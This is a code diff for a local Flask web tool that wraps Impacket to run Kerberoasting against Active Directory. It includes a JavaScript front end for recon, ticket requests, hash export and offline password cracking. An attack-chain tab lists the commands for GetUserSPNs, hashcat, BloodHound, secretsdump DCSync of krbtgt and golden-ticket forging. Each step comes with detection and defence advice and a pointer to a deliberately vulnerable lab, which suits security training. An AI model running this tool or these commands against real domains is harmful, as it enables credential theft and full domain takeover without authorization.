+                <textarea name="users_list" placeholder="svc-sql&#10;svc-web"></textarea></div>
+              <div class="field"><label class="lab">Save directory <span class="flag">(for -save)</span></label>
+                <input type="text" name="save_dir" placeholder="."></div>
+            </fieldset>
+            <fieldset class="fset">
+              <legend>Auto-crack (offline dictionary)</legend>
+              <div class="checks">
+                <label class="chk"><input type="checkbox" name="autocrack"><span class="cx">Auto-crack hashes after roast<span class="flag">RC4 / etype 23</span></span></label>
+              </div>
+              <div class="field" style="margin-top:10px"><label class="lab">Wordlist &mdash; paste candidates, one per line</label>
+                <textarea id="wordlist" placeholder="Password1&#10;Summer2026!&#10;Company123"></textarea></div>
+              <div class="field"><label class="lab">or server wordlist path <span class="flag">(big lists: slow in pure Python)</span></label>
+                <input type="text" id="wordlist_path" placeholder="/usr/share/wordlists/rockyou.txt"></div>
+            </fieldset>
+            <div class="actions">
+              <button type="submit" class="run" id="runBtn"><span class="spin" id="spin"></span><span id="runLabel">Run Kerberoast</span></button>
+              <button type="reset" class="ghost">Reset</button>
+              <span class="elapsed" id="elapsed"></span>
+            </div>
+          </form>
+        </div>
+      </div>
+
+      <div class="card">
+        <h2>Results</h2>
+        <div class="body">
+          <div class="status" id="status" style="display:none"><span class="dot" id="dot"></span><span id="statusText"></span></div>
+          <div id="placeholder" class="empty">
+            <svg width="38" height="38" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.4"><path d="M21 21l-4.3-4.3M11 19a8 8 0 100-16 8 8 0 000 16z"/></svg>
+            <div>Discover a domain, or fill the form, then run.</div>
+          </div>
+          <div id="output" style="display:none">
+            <div class="sec" id="errSec" style="display:none"><div class="errbox" id="errText"></div><div class="hintbox" id="hintText" style="display:none"></div></div>
+            <div class="sec" id="tblSec" style="display:none">
+              <div class="sec-h"><h3>Service accounts (SPNs)</h3><span class="pill" id="spnCount">0</span></div>
+              <div class="tblwrap"><table><thead><tr>
+                <th>ServicePrincipalName</th><th>Name</th><th>MemberOf</th><th>PasswordLastSet</th><th>LastLogon</th><th>Delegation</th>
+              </tr></thead><tbody id="tblBody"></tbody></table></div>
+            </div>
+            <div class="sec" id="hashSec" style="display:none">
+              <div class="sec-h"><h3>Crackable hashes (JtR / hashcat)</h3><span class="pill" id="hashCount">0</span></div>
+              <div class="hashbox" id="hashBox"></div>
+              <div class="btnrow" style="margin-top:10px">
+                <button class="ghost" id="copyBtn">Copy all</button>
+                <button class="ghost" id="dlBtn">Download .txt</button>
+                <span class="pill">mode 13100 (RC4) &middot; 19600/19700 (AES)</span>
+              </div>
+            </div>
+            <div class="sec" id="ticketSec" style="display:none">
+              <div class="sec-h"><h3>Saved tickets</h3></div><div class="hashbox" id="ticketBox"></div>
+            </div>
+            <div class="sec" id="crackSec" style="display:none">
+              <div class="sec-h"><h3>Recovered passwords (by user)</h3><span class="pill" id="crackCount">0</span></div>
+              <div class="recon-status" id="crackProg" style="display:none"><span class="dot run"></span><span id="crackProgText"></span></div>
+              <div class="kv" id="crackKv" style="grid-template-columns:180px 1fr"></div>
+              <div class="btnrow" style="margin-top:10px">
+                <button class="ghost" id="crackBtn">Crack recovered hashes</button>
+                <span class="pill" id="crackNote">RC4 / etype 23 &middot; weak passwords only</span>
+              </div>
+            </div>
+            <div class="sec" id="logSec" style="display:none">
+              <div class="sec-h"><h3>Log</h3><span class="pill" id="logCount">0</span></div><div class="logbox" id="logBox"></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =============== ATTACK CHAIN =============== -->
+  <section class="panel" id="panel-chain">
+    <div class="chain-wrap">
+      <div class="figwrap">
+        <svg class="diagram" viewBox="0 0 1020 300" role="img"
+             aria-label="Five-node Kerberos attack chain: DC IP, Domain and SPN/TGS hash sit left of a dashed red privilege boundary in an 'any authenticated user' zone; KRBTGT and Golden Ticket sit right in a tier-0 zone. The boundary-crossing edge is red, labelled crack, escalate, DCSync.">
+          <defs>
+            <marker id="ah" markerWidth="10" markerHeight="10" refX="7.5" refY="3" orient="auto"><path class="ahead" d="M0,0 L7.5,3 L0,6 Z"></path></marker>
+            <marker id="ahd" markerWidth="10" markerHeight="10" refX="7.5" refY="3" orient="auto"><path class="ahead-d" d="M0,0 L7.5,3 L0,6 Z"></path></marker>
+          </defs>
+          <rect class="region-pre" x="12" y="72" width="566" height="176" rx="12"></rect>
+          <rect class="region-t0" x="604" y="72" width="404" height="176" rx="12"></rect>
+          <text class="regtitle" x="295" y="62" text-anchor="middle">ANY AUTHENTICATED USER</text>
+          <text class="regtitle" x="806" y="62" text-anchor="middle">DOMAIN DOMINANCE &middot; TIER 0</text>
+          <line class="boundary" x1="591" y1="76" x2="591" y2="244"></line>
+          <text class="btext" x="591" y="150" text-anchor="middle" transform="rotate(-90 591 150)">PRIVILEGE BOUNDARY</text>
+          <line class="edge" x1="146" y1="150" x2="210" y2="150" marker-end="url(#ah)"></line>
+          <text class="elabel" x="178" y="140" text-anchor="middle">rootDSE</text>
+          <line class="edge" x1="338" y1="150" x2="406" y2="150" marker-end="url(#ah)"></line>
+          <text class="elabel" x="372" y="140" text-anchor="middle">Kerberoast</text>
+          <line class="edge-danger" x1="548" y1="150" x2="642" y2="150" marker-end="url(#ahd)"></line>
+          <text class="elabel-d" x="596" y="132" text-anchor="middle">crack &rarr; escalate</text>
+          <text class="elabel-d" x="596" y="176" text-anchor="middle">&rarr; DCSync</text>
+          <line class="edge" x1="778" y1="150" x2="840" y2="150" marker-end="url(#ah)"></line>
+          <text class="elabel" x="809" y="140" text-anchor="middle">forge TGT</text>
+          <g><rect class="node" x="26" y="122" width="120" height="56" rx="9"></rect>
+            <text class="nlabel" x="86" y="147" text-anchor="middle">DC IP</text><text class="nsub" x="86" y="164" text-anchor="middle">10.10.10.10</text></g>
+          <g><rect class="node" x="210" y="122" width="128" height="56" rx="9"></rect>
+            <text class="nlabel" x="274" y="147" text-anchor="middle">Domain</text><text class="nsub" x="274" y="164" text-anchor="middle">lab.local &middot; baseDN</text></g>
+          <g><rect class="node" x="418" y="122" width="130" height="56" rx="9"></rect>
+            <text class="nlabel" x="483" y="147" text-anchor="middle">SPN &rarr; TGS</text><text class="nsub" x="483" y="164" text-anchor="middle">$krb5tgs$ hash</text></g>
+          <g><rect class="node-t0" x="642" y="122" width="128" height="56" rx="9"></rect>
+            <text class="nlabel" x="706" y="147" text-anchor="middle">KRBTGT</text><text class="nsub" x="706" y="164" text-anchor="middle">domain master key</text></g>
+          <g><rect class="node-t0" x="840" y="122" width="152" height="56" rx="9"></rect>
+            <text class="nlabel nlabel-t0" x="916" y="147" text-anchor="middle">Golden Ticket</text><text class="nsub" x="916" y="164" text-anchor="middle">forged TGT</text></g>
+        </svg>
+      </div>
+      <p class="figcap">The short version &mdash; <b>ip &gt; domain &gt; spn &gt; golden ticket</b> &mdash; hides the hardest edge.
+        Kerberoasting lands a service-account hash left of the <b>privilege boundary</b>; nothing reaches KRBTGT unless that
+        account is actually privileged and you can DCSync. That red hop is three steps, not one. Tabs 1&ndash;2 run; stages 4&ndash;5 are reference.</p>
+
+      <article class="stage">
+        <div class="st-head"><span class="st-num">01</span><h3 class="st-name">Discovery &mdash; IP to Domain</h3><span class="chip z0">pre-boundary</span><span class="chip att">T1590 / T1087</span></div>
+        <p class="st-mech">A DC answers an <b>unauthenticated</b> query to its <span class="term">rootDSE</span> / SMB negotiation, leaking
+          <span class="term">defaultNamingContext</span> and <span class="term">dnsHostName</span>. Nothing is exploited &mdash; it's advertised by design. <b>This is the Recon tab.</b></p>
+        <div class="cmd"><div class="cmd-tab"><span class="tool">recon &middot; read-only</span></div>
+          <pre><span class="p">$ </span>nxc smb 10.10.10.10                 <span class="cm"># domain, host, OS</span>
+<span class="p">$ </span>ldapsearch <span class="fl">-x</span> <span class="fl">-H</span> ldap://10.10.10.10 <span class="fl">-s</span> base defaultNamingContext</pre></div>
+        <p class="yield"><span class="arw">yields &rarr;</span> <b>lab.local</b>, <b>DC=lab,DC=local</b>, DC host.</p>
+        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
+          <p>Discovery is by-design, so the control is <b>network</b>: segment management interfaces and watch for enumeration bursts. This stage is your cue the rest is coming.</p></div>
+      </article>
+
+      <article class="stage">
+        <div class="st-head"><span class="st-num">02</span><h3 class="st-name">Kerberoast &mdash; Domain to SPN hash</h3><span class="chip z0">pre-boundary</span><span class="chip att">T1558.003</span></div>
+        <p class="st-mech">Any authenticated principal may request a <span class="term">TGS-REP</span> for any SPN; part of it is encrypted with the
+          <b>service account's</b> key. If the KDC offers <span class="term">RC4 (etype 23)</span> it cracks cheaply offline. gMSA/machine accounts are uncrackable &mdash; <b>human-set service accounts are the target.</b> <b>This is the Kerberoast tab.</b></p>
+        <div class="cmd"><div class="cmd-tab"><span class="off">offense</span><span class="tool">&middot; impacket GetUserSPNs &rarr; hashcat</span></div>
+          <pre><span class="p">$ </span>GetUserSPNs.py lab.local/jdoe:pass <span class="fl">-dc-ip</span> 10.10.10.10 <span class="fl">-request</span>
+<span class="p">$ </span>hashcat <span class="fl">-m</span> 13100 tgs.txt rockyou.txt      <span class="cm"># 19600/19700 = AES</span></pre></div>
+        <p class="yield"><span class="arw">yields &rarr;</span> a service account's <b>plaintext</b> &mdash; only if weak.</p>
+        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
+          <p>Watch <span class="evt">Event 4769</span> with encryption type <span class="evt">0x17</span> (RC4) or one account pulling many SPNs. Plant a <b>honeypot SPN</b>; enforce AES; move services to <b>gMSA</b> so the password stops being guessable.</p></div>
+      </article>
+
+      <article class="stage">
+        <div class="st-head"><span class="st-num">03</span><h3 class="st-name">The privilege boundary &mdash; the hop the arrow hides</h3><span class="chip z0">gate</span><span class="chip att">T1078 / T1069</span></div>
+        <p class="st-mech">A cracked service account is just <b>a user</b>. It only advances if it holds privilege &mdash; classically a <b>Domain Admin left with an SPN</b>.
+          This is where <span class="term">spn &gt; golden ticket</span> lies: most roasted accounts go <b>sideways</b>, not up. Map it with BloodHound &mdash; is there a path to Tier 0?</p>
+        <div class="cmd"><div class="cmd-tab"><span class="tool">triage &middot; does it even cross?</span></div>
+          <pre><span class="p">$ </span>bloodhound-python <span class="fl">-u</span> svc <span class="fl">-p</span> cracked <span class="fl">-d</span> lab.local <span class="fl">-c</span> All
+<span class="p">  </span><span class="cm"># shortest path: SVC &rarr; Domain Admins ?</span></pre></div>
+        <p class="yield"><span class="arw">yields &rarr;</span> <b>maybe</b> DA-equivalent rights. Usually: nothing, keep roasting.</p>
+        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
+          <p>This misconfig is why the chain closes &mdash; so close it. Find privileged accounts carrying a <span class="evt">servicePrincipalName</span> and strip it; use <b>Protected Users</b> and a tiered admin model. Break this gate and 4&ndash;5 never happen.</p></div>
+      </article>
+
+      <article class="stage">
+        <div class="st-head"><span class="st-num">04</span><h3 class="st-name">DCSync &mdash; grab the KRBTGT key</h3><span class="chip zt">tier 0</span><span class="chip att">T1003.006</span></div>
+        <p class="st-mech">With <span class="term">Replicating Directory Changes</span> rights (DAs/EAs/DCs by default) an account drives the <b>DRSUAPI</b>
+          replication API and asks a DC to hand over any secret &mdash; <b>no code runs on the DC</b>. Target: <span class="term">krbtgt</span> + domain SID. <b>Reference &mdash; not run by this tool.</b></p>
+        <div class="cmd"><div class="cmd-tab"><span class="tool">reference &middot; impacket secretsdump</span></div>
+          <pre><span class="p">$ </span>secretsdump.py lab.local/dauser@10.10.10.10 <span class="fl">-just-dc-user</span> krbtgt</pre></div>
+        <p class="yield"><span class="arw">yields &rarr;</span> <b>krbtgt NTLM + AES keys</b>, <b>domain SID</b>.</p>
+        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
+          <p>Highest-fidelity alert in the chain: <span class="evt">Event 4662</span> referencing the replication GUID <span class="evt">1131f6aa-&hellip;</span> from a principal that <b>isn't a DC</b>. Restrict replication rights to DCs and monitor that ACL.</p></div>
+      </article>
+
+      <article class="stage">
+        <div class="st-head"><span class="st-num">05</span><h3 class="st-name">Golden Ticket &mdash; forge domain persistence</h3><span class="chip zt">tier 0</span><span class="chip att">T1558.001</span></div>
+        <p class="st-mech">The KRBTGT key signs the <b>PAC</b> in every TGT. With it + the domain SID you <b>forge</b> a TGT for any user/RID/lifetime that the KDC trusts.
+          It survives the user's password reset; only rolling <b>krbtgt twice</b> kills it. This is <b>persistence</b>, not access. <b>Reference &mdash; not run by this tool.</b></p>
+        <div class="cmd"><div class="cmd-tab"><span class="tool">reference &middot; impacket ticketer</span></div>
+          <pre><span class="p">$ </span>ticketer.py <span class="fl">-nthash</span> &lt;krbtgt&gt; <span class="fl">-domain-sid</span> &lt;SID&gt; <span class="fl">-domain</span> lab.local anyuser</pre></div>
+        <p class="yield"><span class="arw">yields &rarr;</span> <b>arbitrary domain impersonation</b>, durable across resets.</p>
+        <div class="defend"><div class="dh"><svg viewBox="0 0 24 24" stroke-width="2"><path d="M12 3l7 4v5c0 4-3 7-7 8-4-1-7-4-7-8V7z"/></svg>Detect &amp; defend</div>
+          <p>Forged tickets leave tells: <b>anomalous TGT lifetimes</b>, a <span class="evt">TGS-REQ with no matching AS-REQ</span> (<span class="evt">4768</span>), RC4 in an AES domain, RID/SID mismatch. On suspicion, <b>roll krbtgt twice</b>. Treat KRBTGT loss as a domain rebuild.</p></div>
+      </article>
+
+      <div class="chain-note">Build the lab with <b style="color:var(--ink)">GOAD</b> (Game of Active Directory) &mdash; a deliberately vulnerable forest
+        with a kerberoastable DA and DCSync paths. Run each hop, watch it fire in your own SIEM, remediate, confirm the alert goes quiet.
+        Refs: MITRE ATT&amp;CK T1558.003 / T1003.006 / T1558.001 &middot; Impacket &middot; Orange-Cyberdefense/GOAD.</div>
+    </div>
+  </section>
+
+  <footer>Wraps Impacket <span style="font-family:var(--mono)">GetUserSPNs.py</span> (Fortra). Served locally &mdash; do not expose to untrusted networks.</footer>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+(function(){
+  // ---- tabs ----
+  var tabs=document.querySelectorAll('.tab');
+  function show(name){
+    tabs.forEach(function(t){t.classList.toggle('active', t.dataset.tab===name);});
+    document.querySelectorAll('.panel').forEach(function(p){p.classList.toggle('active', p.id==='panel-'+name);});
+  }
+  tabs.forEach(function(t){t.addEventListener('click',function(){show(t.dataset.tab);});});
+
+  function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
+  function toast(m){var t=document.getElementById('toast');t.textContent=m;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},1900);}
+  function fmt(ms){return (ms/1000).toFixed(1)+'s';}
+
+  // ---- recon ----
+  var reconBtn=document.getElementById('reconBtn'), reconSpin=document.getElementById('reconSpin'),
+      reconLabel=document.getElementById('reconLabel');
+  async function doRecon(){
+    var ip=document.getElementById('reconIp').value.trim();
+    if(!ip){toast('Enter a DC IP');return;}
+    reconBtn.disabled=true;reconSpin.style.display='inline-block';reconLabel.textContent='Discovering...';
+    document.getElementById('reconErr').style.display='none';
+    document.getElementById('reconOut').style.display='none';
+    var st=document.getElementById('reconStatus'),dot=document.getElementById('reconDot');
+    st.style.display='flex';dot.className='dot run';document.getElementById('reconStatusText').textContent='Connecting to '+ip+' ...';
+    try{
+      var res=await fetch('/api/recon',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({ip:ip})});
+      var s=await res.json();
+      if(s.ok && s.data){
+        var d=s.data;
+        var openPorts=(d.ports||[]).filter(function(p){return p.open;});
+        dot.className='dot ok';
+        document.getElementById('reconStatusText').textContent=
+          (d.domain?('Domain: '+d.domain+' · '):'')+openPorts.length+' AD port(s) open';
+        document.getElementById('rv-domain').textContent=d.domain||'—';
+        document.getElementById('rv-basedn').textContent=d.base_dn||'—';
+        document.getElementById('rv-host').textContent=d.dc_host||'—';
+        document.getElementById('rv-nbdom').textContent=d.netbios_domain||'—';
+        document.getElementById('rv-nbname').textContent=d.netbios_name||'—';
+        document.getElementById('rv-os').textContent=d.os||'—';
+        var pg=document.getElementById('portsGrid');
+        if(d.ports&&d.ports.length){
+          document.getElementById('portsWrap').style.display='block';
+          document.getElementById('portsOpen').textContent=openPorts.length+' / '+d.ports.length+' open';
+          pg.innerHTML=d.ports.map(function(p){
+            return '<div class="port'+(p.open?' open':'')+'"><span class="pd"></span><span class="pp">'+p.port+'</span><span class="ps">'+esc(p.service)+'</span></div>';
+          }).join('');
+        }else{document.getElementById('portsWrap').style.display='none';}
+        document.getElementById('reconOut').style.display='block';
+        document.getElementById('reconOut').dataset.domain=d.domain||'';
+        document.getElementById('reconOut').dataset.ip=ip;
+      }else{
+        dot.className='dot err';document.getElementById('reconStatusText').textContent='No domain';
+        var e=document.getElementById('reconErr');e.style.display='block';
+        e.textContent=(s.error||'Discovery failed.')+(s.hint?('  —  '+s.hint):'');
+      }
+    }catch(err){
+      dot.className='dot err';document.getElementById('reconStatusText').textContent='Request failed';
+      var e2=document.getElementById('reconErr');e2.style.display='block';e2.textContent=err.message;
+    }finally{
+      reconBtn.disabled=false;reconSpin.style.display='none';reconLabel.textContent='Discover';
+    }
+  }
+  reconBtn.addEventListener('click',doRecon);
+  document.getElementById('reconIp').addEventListener('keydown',function(e){if(e.key==='Enter')doRecon();});
+  document.getElementById('toRoast').addEventListener('click',function(){
+    var out=document.getElementById('reconOut');
+    var f=document.getElementById('form');
+    if(out.dataset.domain) f.user_domain.value=out.dataset.domain;
+    if(out.dataset.ip) f.dc_ip.value=out.dataset.ip;
+    show('roast'); f.username.focus();
+    toast('Domain + DC IP sent to Kerberoast');
+  });
+
+  // ---- kerberoast ----
+  var form=document.getElementById('form'),runBtn=document.getElementById('runBtn'),
+      runLabel=document.getElementById('runLabel'),spin=document.getElementById('spin'),
+      elapsedEl=document.getElementById('elapsed'),statusWrap=document.getElementById('status'),
+      dot=document.getElementById('dot'),statusText=document.getElementById('statusText'),
+      placeholder=document.getElementById('placeholder'),output=document.getElementById('output');
+  var poll=null,timer=null,t0=0,currentJob=null,lastHashes=[];
+
+  function setBusy(b){runBtn.disabled=b;spin.style.display=b?'inline-block':'none';runLabel.textContent=b?'Running...':'Run Kerberoast';}
+  function setStatus(c,t){statusWrap.style.display='flex';dot.className='dot '+c;statusText.textContent=t;}
+  function collect(){var d={};new FormData(form).forEach(function(v,k){d[k]=v;});
+    form.querySelectorAll('input[type=checkbox]').forEach(function(c){d[c.name]=c.checked;});return d;}
+  function renderHash(h){var m=h.match(/^(\$krb5tgs\$)(\d+)(\$)/);
+    if(m){return '<span class="et">'+esc(m[1]+m[2]+m[3])+'</span>'+esc(h.slice(m[0].length));}return esc(h);}
+
+  function render(r){
+    output.style.display='block';placeholder.style.display='none';
+    var errSec=document.getElementById('errSec');
+    var errBox=errSec.querySelector('.errbox');
+    var hintEl=document.getElementById('hintText');
+    if(r.error||r.hint){
+      errSec.style.display='block';
+      if(r.error){errBox.style.display='block';document.getElementById('errText').textContent=r.error;errBox.style.borderColor='var(--red-line)';}
+      else{errBox.style.display='none';}
+      if(r.hint){hintEl.style.display='block';hintEl.innerHTML='<b>Hint — </b>'+esc(r.hint);}else{hintEl.style.display='none';}
+    }else{errSec.style.display='none';hintEl.style.display='none';}
+    var rows=r.results||[];var tblSec=document.getElementById('tblSec');
+    if(rows.length){tblSec.style.display='block';
+      document.getElementById('spnCount').textContent=rows.length+(rows.length===1?' SPN':' SPNs');
+      document.getElementById('tblBody').innerHTML=rows.map(function(x){
+        var del='';if(x.delegation==='unconstrained')del='<span class="tag unc">unconstrained</span>';
+        else if(x.delegation==='constrained')del='<span class="tag con">constrained</span>';
+        var mo=x.memberOf?esc(x.memberOf.split(',')[0].replace(/^CN=/i,'')):'<span style="color:var(--faint)">—</span>';
+        return '<tr><td class="spn">'+esc(x.spn)+'</td><td class="name">'+esc(x.sAMAccountName)+'</td><td>'+mo+
+          '</td><td class="mono">'+esc(x.pwdLastSet||'—')+'</td><td class="mono">'+esc(x.lastLogon||'—')+
+          '</td><td>'+(del||'<span style="color:var(--faint)">—</span>')+'</td></tr>';
+      }).join('');}else{tblSec.style.display='none';}
+    var hashes=r.hashes||[];lastHashes=hashes;var hashSec=document.getElementById('hashSec');
+    if(hashes.length){hashSec.style.display='block';
+      document.getElementById('hashCount').textContent=hashes.length+(hashes.length===1?' hash':' hashes');
+      document.getElementById('hashBox').innerHTML=hashes.map(function(h){return '<div class="h">'+renderHash(h)+'</div>';}).join('');
+    }else{hashSec.style.display='none';}
+    var tix=r.saved_tickets||[];var ticketSec=document.getElementById('ticketSec');
+    if(tix.length){ticketSec.style.display='block';
+      document.getElementById('ticketBox').innerHTML=tix.map(function(t){return '<div class="h">'+esc(t)+'</div>';}).join('');
+    }else{ticketSec.style.display='none';}
+    var crackSec=document.getElementById('crackSec');
+    if(hashes.length){
+      crackSec.style.display='block';
+      document.getElementById('crackCount').textContent='0 / '+hashes.length;
+      document.getElementById('crackKv').innerHTML='';
+      document.getElementById('crackProg').style.display='none';
+      if(form.autocrack&&form.autocrack.checked){
+        var _wl=document.getElementById('wordlist').value,_wp=document.getElementById('wordlist_path').value.trim();
+        if(_wl.trim()||_wp){doCrack(hashes);}
+      }
+    }else{crackSec.style.display='none';}
+    var log=r.log||[];var logSec=document.getElementById('logSec');
+    if(log.length){logSec.style.display='block';document.getElementById('logCount').textContent=log.length;
+      document.getElementById('logBox').innerHTML=log.map(function(l){return '<div class="l '+esc(l.level)+'"><span class="lv">'+esc(l.level)+'</span> '+esc(l.message)+'</div>';}).join('');
+    }else{logSec.style.display='none';}
+    if(r.ok&&!rows.length&&!hashes.length&&!r.error){errSec.style.display='block';
+      errBox.style.display='block';document.getElementById('errText').textContent='No SPN entries found.';
+      errBox.style.borderColor='var(--line)';hintEl.style.display='none';}
+  }
+  function stopPolling(){if(poll){clearInterval(poll);poll=null;}if(timer){clearInterval(timer);timer=null;}}
+  function startTimer(){t0=Date.now();elapsedEl.textContent='0.0s';timer=setInterval(function(){elapsedEl.textContent=fmt(Date.now()-t0);},100);}
+
+  form.addEventListener('submit',async function(ev){
+    ev.preventDefault();stopPolling();setBusy(true);startTimer();
+    setStatus('run','Submitting job...');output.style.display='none';placeholder.style.display='none';
+    var job;
+    try{
+      var res=await fetch('/api/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(collect())});
+      var data=await res.json();
+      if(!res.ok){throw new Error(data.error||('HTTP '+res.status));}
+      job=data.job_id;currentJob=job;
+    }catch(err){setBusy(false);stopPolling();setStatus('err','Request failed');
+      output.style.display='block';document.getElementById('errSec').style.display='block';
+      document.getElementById('errText').textContent=err.message;return;}
+    setStatus('run','Querying LDAP and requesting tickets...');
+    poll=setInterval(async function(){
+      try{
+        var res=await fetch('/api/status/'+job);var s=await res.json();
+        if(s.state==='running')return;
+        stopPolling();setBusy(false);elapsedEl.textContent=fmt(Date.now()-t0);
+        if(s.state==='error'||s.error){setStatus('err','Finished with errors - '+elapsedEl.textContent);}
+        else{var n=(s.results||[]).length,h=(s.hashes||[]).length;setStatus('ok','Done - '+n+' SPN(s), '+h+' hash(es) - '+elapsedEl.textContent);}
+        render(s);
+      }catch(err){stopPolling();setBusy(false);setStatus('err','Lost connection to server');}
+    },1200);
+  });
+  document.getElementById('copyBtn').addEventListener('click',function(){
+    if(!lastHashes.length){toast('Nothing to copy');return;}
+    var text=lastHashes.join('\n');
+    navigator.clipboard.writeText(text).then(function(){toast('Copied '+lastHashes.length+' hash(es)');},function(){
+      var ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();
+      try{document.execCommand('copy');toast('Copied');}catch(e){toast('Copy failed');}document.body.removeChild(ta);});
+  });
+  document.getElementById('dlBtn').addEventListener('click',function(){
+    if(currentJob)window.location='/api/download/'+currentJob;else toast('Run a job first');});
+
+  // ---- offline crack (by user) ----
+  async function doCrack(hashes){
+    if(!hashes||!hashes.length){toast('No hashes to crack');return;}
+    var wl=document.getElementById('wordlist').value, wp=document.getElementById('wordlist_path').value.trim();
+    if(!wl.trim()&&!wp){show('roast');toast('Add a wordlist to crack');return;}
+    var sec=document.getElementById('crackSec');sec.style.display='block';
+    var prog=document.getElementById('crackProg');prog.style.display='flex';
+    document.getElementById('crackProgText').textContent='Cracking '+hashes.length+' hash(es)...';
+    document.getElementById('crackKv').innerHTML='';
+    document.getElementById('crackBtn').disabled=true;
+    try{
+      var res=await fetch('/api/crack',{method:'POST',headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({hashes:hashes,wordlist:wl,wordlist_path:wp})});
+      var d=await res.json();
+      if(!res.ok){throw new Error(d.error||('HTTP '+res.status));}
+      var jid=d.job_id;
+      await new Promise(function(resolve){
+        var pt=setInterval(async function(){
+          try{
+            var r=await fetch('/api/crack_status/'+jid);var s=await r.json();
+            if(s.progress){document.getElementById('crackProgText').textContent=
+              'Tried '+(s.progress.tried||0)+' words · '+(s.progress.found||0)+' found';}
+            if(s.state==='running')return;
+            clearInterval(pt);prog.style.display='none';renderCrack(s);resolve();
+          }catch(e){clearInterval(pt);prog.style.display='none';resolve();}
+        },600);
+      });
+    }catch(err){prog.style.display='none';document.getElementById('crackNote').textContent=err.message;}
+    finally{document.getElementById('crackBtn').disabled=false;}
+  }
+  function renderCrack(s){
+    var cracked=s.cracked||[];
+    document.getElementById('crackCount').textContent=cracked.length+' / '+(s.total||0)+' cracked';
+    var kv=document.getElementById('crackKv');
+    if(cracked.length){
+      kv.innerHTML=cracked.map(function(c){
+        return '<div class="k">'+esc(c.user)+'</div><div class="v teal">'+esc(c.password)+'</div>';}).join('');
+    }else{
+      kv.innerHTML='<div class="k">—</div><div class="v" style="color:var(--faint)">no passwords recovered from this wordlist</div>';
+    }
+    var note=[];
+    if(s.unsupported&&s.unsupported.length){note.push(s.unsupported.length+' AES ticket(s) skipped — export & use hashcat');}
+    note.push('tried '+(s.tried||0)+' words');
+    if(s.error){note.push(esc(s.error));}
+    document.getElementById('crackNote').textContent=note.join(' · ');
+  }
+  document.getElementById('crackBtn').addEventListener('click',function(){doCrack(lastHashes);});
+
+  form.addEventListener('reset',function(){stopPolling();setBusy(false);
+    output.style.display='none';statusWrap.style.display='none';placeholder.style.display='block';elapsedEl.textContent='';
+    document.getElementById('crackSec').style.display='none';});
+})();
+</script>
+</body>
 </html>
 """
-
-# Note: The full PAGE_HTML string is present in the file (omitted here in the
-# create call preview for brevity). The actual file written contains the full
-# HTML as in the workspace's attachment; run the script directly.
 
 
 def _render_page():
@@ -819,9 +1566,9 @@ def _render_page():
     return PAGE_HTML.replace("%%IMPORT_ERROR_BANNER%%", banner)
 
 
-# ==========================================================================
+# ===========================================================================
 #  BACKEND  --  Flask routes + background job runner
-# ==========================================================================
+# ===========================================================================
 
 app = Flask(__name__)
 
@@ -857,7 +1604,7 @@ def _validate(data):
     #   -k          -> taken from the Kerberos ccache (KRB5CCNAME)
     #   -no-preauth -> AS-REP roasting, no bind as yourself
     if not username and not no_preauth and not kerberos:
-        return None, "Username is required unless you enable -k (use Kerberos ccache) or -no-preauth (AS-REP roasting)."
+        return None, "Username is required unless you enable -k (ccache) or -no-preauth."
     if not no_preauth and not (password or hashes or aes_key or kerberos or no_pass):
         return None, "Provide a password, NTLM hashes, an AES key, or enable Kerberos/-no-pass."
 
@@ -932,7 +1679,8 @@ def api_status(job_id):
     if job["result"] is not None:
         r = job["result"]
         resp.update({"ok": r.get("ok"), "results": r.get("results", []), "hashes": r.get("hashes", []),
-                     "saved_tickets": r.get("saved_tickets", []), "log": r.get("log", []), "error": r.get("error")})
+                     "saved_tickets": r.get("saved_tickets", []), "log": r.get("log", []),
+                     "error": r.get("error"), "hint": r.get("hint")})
     return jsonify(resp)
 
 
